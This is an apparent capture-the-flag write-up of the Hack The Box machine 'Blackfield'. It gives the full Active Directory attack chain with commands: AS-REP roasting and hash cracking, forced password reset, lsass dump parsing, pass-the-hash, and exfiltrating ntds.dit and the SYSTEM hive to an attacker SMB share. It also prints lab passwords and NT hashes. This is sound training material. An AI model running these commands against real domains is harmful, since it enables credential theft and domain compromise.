---
description: https://app.hackthebox.com/machines/255
---

# 🧑‍✈️ Blackfield

We start by doing a quick nmap:&#x20;

<figure><img src="../../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

We can see DNS on port 53, Kerberos on port 88 and secured LDAP on port 3268 and a domain BLACKFIELD.local

So in our /etc/hosts we add the following:

```
10.129.229.17 BLACKFIELD.local BLACKFIELD
```

It's good to note we do not have a webserver&#x20;

then, always good to try rpcclient on an Active Directory:

<figure><img src="../../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>

```
rpcclient 10.129.229.17
#did not work
rpcclient 10.129.229.17 -U ''
#we tried to do a null auth and it worked
```

We tried enumerating users with the following command:

```
enumdomusers
```

But we got access denied so we leave rpcclient. More on enumerating rpccclient ->

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}

Since we saw SMB, we can try enumerating that:

```
smbclient -L 10.129.229.14
smbclient -L 10.129.229.14 -U ''
```

So we get few shares but we got the same output from the 2 commands:

<figure><img src="../../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>

We continue our smb enumeration with CrackMapExec since smbclient is not very verbose on the read/write side of things:

It's good to know that some tools need multiple tries to be sure we didn't miss anything:

```
cme smb 10.129.229.17 --shares
cme smb 10.129.229.17 --shares -u ''
cme smb 10.129.229.17 --shares -u '' -p ''
cme smb 10.129.229.17 --shares -u 'testUser'
cme smb 10.129.229.17 --shares -u 'testUser' -p ''
```

<figure><img src="../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

So know we know we can read the IPC and "profiles shares:

```
smbclient '//10.129.229.17/profiles$'
```

another way of seeing this is using smbmap:

```
smbmap -H 10.129.229.17 -u null
```

<figure><img src="../../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>

We put it in single quotes because the $ is a shady character that could cause some errors

<figure><img src="../../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>

So we got a big list of users, the good thing to do now is to mount it but i did not manage to do so. So I manually created a list of all possible usernames

So now to see if those are valid users, we use krbrute and specify the domain controller and the domain flag and redirect the output to an out file for the report:

```
kerbrute userenum --dc 10.129.229.17 -d blackfield  users.lst -o kerburute.userenum.out
```

and we have a few valid usernames:

<figure><img src="../../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>

So the username audit2020@blackfield is a good hint, since there was a share that was called "Forensic /audit share"

So we remember we outputted the result in a kerbrute.userenum file, and now we need to grep out what is interesting for us:

```
grep VALID kerburute.userenum.out | awk '{print $7}'
```

<figure><img src="../../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

1. `grep VALID kerbrute.userenum.out`: This part of the command uses `grep` to search for lines in the file `kerbrute.userenum.out` that contain the word "VALID". `grep` is a command-line utility for searching plain-text data sets for lines that match a regular expression.
2. `|`: This symbol is called a pipe. It's used to redirect the output of one command (in this case, `grep`) as input to another command (in this case, `awk`).
3. `awk '{print $7}'`: This part of the command uses `awk` to process the output of `grep`. `awk` is a versatile programming language mainly used for pattern scanning and processing. Here, `{print $7}` specifies that `awk` should print the seventh field of each input line.

We can even go further and get rid of the @blackfield tag:

```
grep VALID kerburute.userenum.out | awk '{print $7}' | awk -F\@ '{print $1}' >users.lst
```

<figure><img src="../../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>

now with those valid users we'd want to use impacket's kerberos pre-auth check ->

```
GetNPUsers.py -dc-ip 10.129.229.17 -no-pass -usersfile users.lst blackfield/
```

<figure><img src="../../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

So now we just go on hashcat and crack it (krbtgt = mode 18200):

```
hashcat -m 18200 blackfield.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (904).png" alt=""><figcaption><p>#00^BlackKnight</p></figcaption></figure>

So now we can use those creds to try and enumerate our SMB server some more

```
cme smb 10.129.229.17 --shares -u support -p '#00^BlackKnight'
```

So i tried mounting the share again with the creds and surprisingly it worked:

```
sudo mount -t cifs -o 'username=support,password=#00^BlackKnight' //10.129.229.17/profiles$ /mnt
```

* `-t cifs`: This specifies the filesystem type to be mounted. In this case, it's `cifs`, which stands for Common Internet File System. This indicates that the share being mounted is an SMB (Server Message Block) share.
* `-o 'username=support,password=#00^BlackKnight'`: This option specifies mount options. In this case, it provides the username and password required to access the SMB share. The username is `support` and the password is `#00^BlackKnight`. The `-o` flag stands for "options".
* `//10.129.229.17/profiles$`: This is the network path to the SMB share. It consists of the server's IP address (`10.129.229.17`) followed by the share name (`profiles$`). The `profiles$` suffix typically indicates a hidden administrative share.
* `/mnt`: This is the local directory where the SMB share will be mounted. In Unix-like systems, mounting a filesystem means attaching the filesystem to a specific directory (mount point), making its contents accessible at that location.

we can access all user files:

<figure><img src="../../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

So i try to access the support file, but there is nothing inside, i try looking around but nothing there:

<figure><img src="../../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

So now we unmount the folder and connect via rpcclient:

```
umount /mnt
rpcclient -U support 10.129.229.17
```

and use the&#x20;

```
enumdomusers
```

command to find some more users:

<figure><img src="../../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

Now we put this in a file and use the following command to clean the output:

```
cat rpcusers.lst | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > newRpcClient.lst
```

<figure><img src="../../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

We reuse the GetNpUsers.py command:

```
GetNPUsers.py -dc-ip 10.129.229.17 -no-pass -usersfile newRpcClient.lst blackfield/
```

&#x20;So unfortunately we did not find any new hashes

we'll download the python version of bloodhound: [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)

now we need to do some .conf manipulation  and remove all related to this box in our /etc/hosts file->

<figure><img src="../../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

1. `nameserver 10.129.229.17`: This entry specifies the IP address of the DNS server that the system should use for domain name resolution. In this case, `10.129.229.17` is likely the IP address of the domain controller or another DNS server within the domain infrastructure. Configuring the correct DNS server ensures that the system can properly resolve domain names to their corresponding IP addresses.
2. `search blackfield`: This entry specifies the default domain search suffix to be appended to unqualified domain names. When you attempt to resolve a hostname without specifying its fully qualified domain name (FQDN), the system will append the search suffix to the hostname before attempting resolution. This is particularly useful in a domain environment where most hostnames belong to the same domain. In this case, `blackfield` is the domain name, so specifying it as the search suffix allows you to refer to hosts within the `blackfield` domain without typing their FQDNs every time.

By adding these entries to the `resolv.conf` file, you ensure that your system is properly configured to resolve domain names within the `blackfield` domain, which can be beneficial for various network-related tasks, including using BloodHound to analyze Active Directory permissions and trust relationships.

And then we are able to trigger the following command:

```
python3 bloodhound.py -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d blackfield.local -c all
```

<figure><img src="../../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

So now we got a whole lotta json files:

<figure><img src="../../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>

we are going to launch a neo4j console:

```
neo4j console
```

<figure><img src="../../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>

And next we need to open bloodhound, this was the following path i needed to follow in my pwnbox to get to it:

<figure><img src="../../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

managed to connect with the creds neo4j/neo4j

So happy to be at this point of the box, now we upload all our json files on the bloodhound instance, panicked for a bit because nothing really seemed to pop on the screen but if we type in "support" in the search bar there will be a "SUPPORT@BLACKFIELD.LOCAL" user that will pop that we will mark as **owned**

<figure><img src="../../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>

We then need to declare the user as "starting node" and then access the pre built queries:

<figure><img src="../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

i then check out the node info and find interesting details in the "outbound object control" that counts 1 parameterin the "first degree object control" and When we click the “1”, I can see that support has “ForceChangePassword” on AUDIT2020:

<figure><img src="../../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

* **Outbound Object Control**: This property refers to the permissions and access rights that the node (e.g., user account) has over other objects in the AD environment. In this context, "outbound" means the permissions granted by the node to other objects.
* **First Degree Object Control**: This property specifically indicates the level of control or permissions granted by the node directly to other objects. "First degree" implies a direct relationship between the node and the objects it controls.
* **"ForceChangePassword" Permission**: This permission allows the user (in this case, the "support" user) to force a password change for other user accounts. In your case, it seems like the "support" user has the "ForceChangePassword" permission specifically on the "AUDIT2020" object.

We could abuse this in powershell if we were on a Windows machine with a right click on "forcechangepassword" -> :

<figure><img src="../../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

So we are going to go and use rpcclient to change the password of Audit2020, and we need to be aware of password complexity policies:

<figure><img src="../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

And now if we look at the shares we can access the forensic shares:

<figure><img src="../../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

So now we go and do again our mount manipulation ->

```
sudo mount -t cifs -o 'username=Audit2020,password=PleaseSub!' //10.129.229.17/forensic /mnt
```

<figure><img src="../../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

The file that stand out is the lsass.zip file because lsass is where mimikatz pulls plaintext passwords from, so we copy, unzip it and look on internet for the perfect tool:

<figure><img src="../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

while looking up we cross upon this tool:[https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

we can also get it with pip3:

```
pip3 install pypypkatz
```

and after looking at the manuel

<figure><img src="../../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

run the following:

```
pypykatz lsa minidump lsass.DMP > lsass.out
```

<figure><img src="../../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

Now we got plenty of args so we'll grep out what we think are interesting:

```
grep NT lsass.out -B3 | grep -i username
```

<figure><img src="../../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

```
svc_backup -> 9658d1d1dcd9250115e2205d9f48400d
Administrator -> 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

So now we can try CrackMapExec with those NT hashes:

```
cme smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

and we manage to have access to svc\_backup:

<figure><img src="../../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

So now a good thing to try would be to use evil-winrm, let's test out some fun stuff:

```
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

<figure><img src="../../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

With a quick&#x20;

```
whoami /priv
```

I quickly see the high privileges of this user:

<figure><img src="../../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}

{% embed url="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" %}

{% embed url="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26" %}

Using the tool Robocopy:

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" %}

Using the following command:

```
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

We are ableto see that we have access denied on the root.txt file, and we retrieve some interesting stuff in the :C\ repo:

<figure><img src="../../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

We later on discover a notes.txt file that explains why we can't access it. the file was encrypted:

<figure><img src="../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

So we first need to gain admin privileges before we want to read anything, we'll start by configuring a samaba server with auth in order to abuse SeBackup and SeRestore privileges to dum AD DB in an attempt to use the admin hash to performe PtH ->

In resolve.conf file we add the following ->

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    interfaces = tun0
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

Here's the breakdown:

1. `[global]` section:
   * `map to guest = Bad User`: This directive specifies how Samba should handle connections from clients that try to authenticate as a guest but fail. "Bad User" means that if a user tries to log in as a guest and fails, they'll be treated as the guest user.
   * `server role = standalone server`: This indicates that the Samba server is operating as a standalone server, meaning it is not part of an Active Directory domain or a member of another Samba domain.
   * `usershare allow guests = yes`: Allows guest users to create and use user-defined shares.
   * `idmap config * : backend = tdb`: Specifies the backend storage for the ID mapping. In this case, it's using the TDB (Trivial Database) backend for mapping user and group IDs.
   * `interfaces = tun0`: This restricts Samba to only listen on the network interface specified (`tun0` in this case).
   * `smb ports = 445`: Specifies the TCP ports that Samba will use for incoming SMB connections.
2. `[smb]` section:
   * `comment = Samba`: A comment describing the share.
   * `path = /tmp/`: Specifies the directory that will be shared.
   * `guest ok = yes`: Allows guest users to access the share without authentication.
   * `read only = no`: Allows both reading from and writing to the shared directory.
   * `browsable = yes`: Indicates that the share will be visible to browsing clients.
   * `force user = smbuser`: Forces all users accessing this share to be mapped to the user specified (`smbuser` in this case).

Then we add a user called smbuser and define it's password:

```
adduser smbpass
smbpasswd -a smbuser
```

and on our winrm sesh, we mount the share:

```
net use k: \\10.10.14.141\smb /user:smbuser smbpass
```

Now our goal will be to backup the NTDS folder using Wbadmin:

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-attack" %}

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.141\smb -include:c:\windows\ntds
```

<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

We can see that it backed up successfully:

<figure><img src="../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>

Now we'll need to recover the version of the backup:

```
wbadmin get versions
```

Be careful to take the good backup version:

<figure><img src="../../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>

```
echo "Y" | wbadmin start recovery -version:05/01/2024-16:36 -itemtype:file -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

<figure><img src="../../../.gitbook/assets/image (944).png" alt=""><figcaption><p>Pretty happy of this after hours of troubleshooting <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>

We then need to export the system hive too:

```
reg save HKLM\SYSTEM C:\system.hive
```

{% embed url="https://zer1t0.gitlab.io/posts/attacking_ad/#lsass-credentials" %}

We then donwload everything to our local machine:

<figure><img src="../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>

Was a bit afraid because i couldn't find the files but they were just in the Desktop of elfelixio:

<figure><img src="../../../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>

















So we do the following commands but we fail:

<figure><img src="../../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

```
sudo smbserver.py -smb2support -user elfelixio -password TestPass OurShare $(pwd)
```

`sudo smbserver.py -smb2support -user elfelixio -password TestPass OurShare $(pwd)` is used to start a Samba server using Python.

* `smbserver.py`: This is a Python script that emulates a Samba server. Samba is a free software re-implementation of the SMB/CIFS networking protocol, and smbserver.py is a tool that allows you to create a Samba server on the fly.
* `-smb2support`: This option enables SMB2 support. SMB2 is a version of the Server Message Block (SMB) protocol. It was introduced in Windows Vista to improve security and performance over the original SMB protocol.
* `-user elfelixio`: This option sets the username for the Samba server to "elfelixio". This is the username that clients will use to connect to the server.
* `-password TestPass`: This option sets the password for the Samba server to "TestPass". This is the password that clients will use to connect to the server.
* `OurShare`: This is the name of the share that will be created on the Samba server. Clients will use this name to access the shared resources.
* `$(pwd)`: This is a shell command that returns the current working directory. In this context, it means that the Samba server will share the current directory.

```
net use x: \\10.10.14.141\OurShare /user:elfelixio TestPass
```

`net use x: \\10.10.14.141\OurShare /user:elfelixio TestPass` is used in Windows to map a network drive to a shared folder located on another computer or server.

* `net use`: This is the command used to connect to shared resources on a network.
* `x:`: This is the drive letter that will be assigned to the shared resource. You can choose any available letter.
* `\\10.10.14.141\OurShare`: This is the UNC (Universal Naming Convention) path of the shared resource. `10.10.14.141` is the IP address of the computer or server hosting the shared resource, and `OurShare` is the name of the shared folder.
* `/user:elfelixio TestPass`: This specifies the username and password to be used to connect to the shared resource. `elfelixio` is the username, and `TestPass` is the password.

Using some ressources we see that this error is related to NTFS folder so we create one:

<figure><img src="../../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

```
dd if=/dev/zero of=ntfs.disk bs=1024M count=2 
sudo losetup -fP ntfs.disk 
losetup -a
```

and to complete our ntfs disk:

```
sudo mkfs.ntfs /dev/loop1
```

<figure><img src="../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

we now cd into our mounted smb file and re run our failed commands:

We get some better results but fail; apparently impacket does not handle well NTFS:

<figure><img src="../../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

So we are going to use the legit smb pass to do this, so i nano intp /etc/samba/smb.confand then duplicate and modify the print part:

<figure><img src="../../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>

now we need to restart smb:

```
systemctl restart smbd
```

<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

Now we re run all the goofy commands we did earlier, and test out if it works but creating a folder in the winrm sesh and accessing it via our local terminal with a&#x20;

```
watch -n 1 'ls -al'
```
